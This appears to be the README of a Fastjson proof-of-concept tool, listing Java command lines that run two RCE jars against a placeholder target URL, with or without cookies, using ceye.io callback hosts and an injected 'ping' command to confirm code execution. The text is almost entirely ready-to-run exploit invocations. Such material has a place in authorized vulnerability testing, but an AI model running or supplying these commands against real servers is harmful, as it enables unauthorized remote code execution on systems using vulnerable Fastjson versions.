# Fastjson-POC
Fastjson-POC

# 有cookies
java -jar fastjson-2019-Rce.jar http://attackURL/ aaaaa.ceye.io/test cookies

java -jar fast-2018-Rce.jar http://attackURL/ cookies "ping test.ceye.io"


# 无cookies

java -jar fastjson-2019-Rce.jar http://attackURL/ aaaaa.ceye.io/test null

java -jar fast-2018-Rce.jar http://attackURL/ null "ping test.ceye.io"
